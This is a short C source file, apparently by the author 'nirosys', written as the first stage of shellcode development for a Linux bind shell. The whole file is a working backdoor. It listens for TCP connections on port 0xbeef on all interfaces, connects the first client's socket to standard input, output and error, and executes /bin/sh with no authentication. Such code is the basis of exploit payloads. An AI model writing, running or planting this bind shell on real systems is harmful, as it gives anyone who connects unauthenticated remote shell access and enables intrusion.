/* nirosys <0xcd80>
 * Stage 1 Shellcode Development
 *    C Source For Linux Bind Shell
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/types.h>

int main( argc, argv )
    int argc;
    char **argv;
{
    int			port = 0xbeef,
			listenfd,
			connfd;
    struct sockaddr_in  servaddr;
    char               *command[] = { "/bin/sh", NULL, NULL };


    listenfd = socket(AF_INET,SOCK_STREAM,0);
    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(port);

    bind(listenfd,(struct sockaddr_t *)&servaddr,sizeof(servaddr));
    listen(listenfd,4);
    connfd = accept(listenfd,NULL,NULL);
    dup2(connfd,0);
    dup2(connfd,1);
    dup2(connfd,2);
    execve(command[0],command,NULL);

}
